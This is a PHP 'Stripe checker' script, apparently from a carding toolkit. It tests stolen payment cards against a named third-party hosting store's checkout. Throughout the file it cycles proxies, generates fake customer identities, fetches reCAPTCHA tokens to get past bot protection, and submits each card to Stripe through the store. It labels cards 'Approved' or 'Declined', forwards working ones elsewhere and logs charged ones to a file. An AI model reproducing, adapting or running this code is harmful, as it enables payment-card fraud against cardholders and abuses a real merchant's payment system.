<?php
require_once("functions.php");
session_start();
if(!isset($_SESSION["user_id"])){
    header("Location: login.php");
    exit;
}
$userId = $_SESSION["user_id"];

##################### STRIPE RAW BY THEFLASHXD ###########################
error_reporting(0);
date_default_timezone_set('Asia/Jakarta');

@unlink('cookie.txt');
if ($_SERVER['REQUEST_METHOD'] == "POST") {
    extract($_POST);
} elseif ($_SERVER['REQUEST_METHOD'] == "GET") {
    extract($_GET);
}
function GetStr($string, $start, $end) {
    $str = explode($start, $string);
    $str = explode($end, $str[1]);  
    return $str[0];
}
function inStr($string, $start, $end, $value) {
    $str = explode($start, $string);
    $str = explode($end, $str[$value]);
    return $str[0];
}
$separa = explode("|", $ip);
$cc = $separa[0];
$mes = $separa[1];
$ano = $separa[2];
$cvv = $separa[3];

$proxyFile = 'flash2.txt';

if (!file_exists($proxyFile)) {
    die("❌ Proxy file not found.\n");
}

$proxies = array_filter(array_map('trim', file($proxyFile)));
if (empty($proxies)) {
    die("⚠️ No proxies found in flash2.txt\n");
}

// Pick one random proxy
$proxydefault = $proxies[array_rand($proxies)];
echo "#Proxy:「 $proxydefault 」\n";
function value($str,$find_start,$find_end)
{
    $start = @strpos($str,$find_start);
    if ($start === false) 
    {
        return "";
    }
    $length = strlen($find_start);
    $end    = strpos(substr($str,$start +$length),$find_end);
    return trim(substr($str,$start +$length,$end));
}

function mod($dividendo,$divisor)
{
    return round($dividendo - (floor($dividendo/$divisor)*$divisor));
}

####################################################
if (strlen($ano) == 2) {
  $ano = "20".$ano;
}else {
 $ano = $ano;
}
######################################################################################################
$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $proxydefault);
curl_setopt($ch, CURLOPT_URL, 'https://randomuser.me/api/1.2/?nat=us');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
$curl = curl_exec($ch);
curl_close($ch);
$first = trim(strip_tags(getStr($curl,'"first":"','"')));
$last = trim(strip_tags(getStr($curl,'"last":"','"')));
$email = ''.$first.'.'.$last.'@gmail.com';
######################################################################################################
$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $proxydefault);
curl_setopt($ch, CURLOPT_URL, 'https://www.google.com/recaptcha/api2/anchor?ar=1&k=6LdBopUaAAAAAMNFTecuFkhyAq-ThETzVAEmJpLd&co=aHR0cHM6Ly9ob3N0aW5nLnJlYnNkZXNpZ25zLmNvbTo0NDM.&hl=en&v=GUGrl5YkSwpBsxsF3eY665Ye&size=invisible&cb=wosvnihspm4w');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd() . '/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd() . '/cookie.txt');
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
    'Pragma: no-cache',
    'Accept: */*',
]);
curl_setopt($ch, CURLOPT_HEADER, true);

$response = curl_exec($ch);
$body = $response;
$redirectUrl = curl_getinfo($ch, CURLINFO_EFFECTIVE_URL);
if (false !== ($st = strpos($body, '"hidden" id="recaptcha-token" value="'))) {
    $st += strlen('"hidden" id="recaptcha-token" value="');
    $body = substr($body, $st);
}
if (false !== ($ed = strpos($body, '"'))) {
    $body = substr($body, 0, $ed);
}
curl_close($ch);

// echo "<br><hr>TOKEN => $body<br>";
// echo "<br><hr>ADDRESS => $redirectUrl<br>";
#####################################################################################################
$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $proxydefault);
curl_setopt($ch, CURLOPT_URL, 'https://www.google.com/recaptcha/api2/reload?k=6LdBopUaAAAAAMNFTecuFkhyAq-ThETzVAEmJpLd');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd() . '/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd() . '/cookie.txt');
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
    'Pragma: no-cache',
    'Accept: */*',
    'referer: ' . $redirectUrl . '',
]);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'v=GUGrl5YkSwpBsxsF3eY665Ye&reason=q&c=' . $body . '&k=6LdBopUaAAAAAMNFTecuFkhyAq-ThETzVAEmJpLd&co=aHR0cHM6Ly9ob3N0aW5nLnJlYnNkZXNpZ25zLmNvbTo0NDM.&hl=en&size=invisible&chr=%5B89%2C64%2C27%5D&vh=13599012192&bg=');

$response = curl_exec($ch);
$body = $response;
if (false !== ($st = strpos($body, '["rresp","'))) {
    $st += strlen('["rresp","');
    $body = substr($body, $st);
}
if (false !== ($ed = strpos($body, '"'))) {
    $body = substr($body, 0, $ed);
}
curl_close($ch);
// echo "<br><hr>FINAL_TOKEN => $body<br>";
####################################################################################################
$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $proxydefault);
curl_setopt($ch, CURLOPT_URL, 'https://hosting.rebsdesigns.com/index.php?rp=/store/discord-bot-hosting/generic');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
$headers = array();
$headers[] = 'content-type: application/x-www-form-urlencoded; charset=UTF-8';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd() . '/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd() . '/cookie.txt');
$curl = curl_exec($ch);
curl_close($ch);
$csf = trim(strip_tags(getStr($curl, "csrfToken = '", "'")));
// echo "<br><hr>csrfToken => $csf<br>";
#########################################################################
$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $proxydefault);
curl_setopt($ch, CURLOPT_URL, 'https://hosting.rebsdesigns.com/cart.php');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'content-type: application/x-www-form-urlencoded; charset=UTF-8';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd() . '/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd() . '/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'ajax=1&a=confproduct&configure=true&i=0&billingcycle=monthly&configoption%5B5%5D=35');
$curl = curl_exec($ch);
curl_close($ch);
// echo "<br><hr>curl => $curl<br>";
########################################
$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $proxydefault);
curl_setopt($ch, CURLOPT_URL, 'https://hosting.rebsdesigns.com/cart.php?a=checkout&e=false');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
$headers = array();
$headers[] = 'content-type: application/x-www-form-urlencoded; charset=UTF-8';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd() . '/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd() . '/cookie.txt');
$curl = curl_exec($ch);
curl_close($ch);
$csf = trim(strip_tags(getStr($curl, "csrfToken = '", "'")));
$pi = trim(strip_tags(getStr($curl, "stripe = Stripe('", "'")));
// echo "<br><hr>pi => $pi<br>";die();
#########################################################
$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $proxydefault);
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'content-type: application/x-www-form-urlencoded; charset=UTF-8';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd() . '/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd() . '/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=b71e6727-e215-4321-86fb-e144ff1cf5e4dc561f&muid=d1638923-e02b-4a44-abc0-c8e01fb894231f42ed&sid=2d7debf7-2894-48af-9372-4f9a207f57ed2ddb02&pasted_fields=number&payment_user_agent=stripe.js%2Fd16ff171ee%3B+stripe-js-v3%2Fd16ff171ee%3B+split-card-element&referrer=https%3A%2F%2Fhosting.rebsdesigns.com&time_on_page=85960&key='.$pi.'');
$curl = curl_exec($ch);
curl_close($ch);
$id = trim(strip_tags(getStr($curl, '"id": "', '"')));
$ms = trim(strip_tags(getStr($curl, 'message": "', '"')));
if (empty($id)) {
    echo '#Declined '.$ip.'「Declined : '.$ms.' : @luffy_dxD」';
    die();
}
#########################################################
$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $proxydefault);
curl_setopt($ch, CURLOPT_URL, 'https://hosting.rebsdesigns.com/index.php?rp=/stripe/payment/intent');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'content-type: application/x-www-form-urlencoded; charset=UTF-8';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd() . '/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd() . '/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'token='.$csf.'&custtype=new&loginemail=&loginpassword=&firstname='.$first.'&lastname='.$last.'&email='.urlencode($email).'&country-calling-code-phonenumber=1&phonenumber=2042456&companyname=&address1=15+Cliff+Street&address2=&city=New+York&state=New+York&postcode=10038&country=US&password=oX%7D*OMs(lN!%7D&password2=oX%7D*OMs(lN!%7D&applycredit=1&paymentmethod=stripe&ccinfo=new&ccdescription=&notes=&marketingoptin=1&g-recaptcha-response='.$body.'&payment_method_id='.$id.'');
$curl = curl_exec($ch);
curl_close($ch);
$error = trim(strip_tags(getStr($curl, 'validation_feedback":"', '"')));

if(strpos($curl, 'Your card has insufficient funds.')){
    echo '#Approved '.$ip.'「Insufficient Funds」 「Stripe Charge : @luffy_dxD」';
    forwardLives("Stripe",$error);
    }
    elseif(strpos($curl, 'security code is incorrect.')){
    echo '#Approved '.$ip.'「'.$error.'」 「Stripe Charge : @luffy_dxD」';
        forwardLives("Stripe",$error);
    }
    elseif(strpos($curl, 'success":true')){
    echo '#Approved '.$ip.'「CHARGED CVV」 「Stripe Charge : @luffy_dxD';
    fwrite(fopen("fortu.txt", 'a'), $ip. "\r\n");
        forwardLives("Stripe","CHARGED CVV");
    }
    else{
    echo '#Declined '.$ip.'「Declined : '.$error.' : @luffy_dxD」';
    }
    




















?>
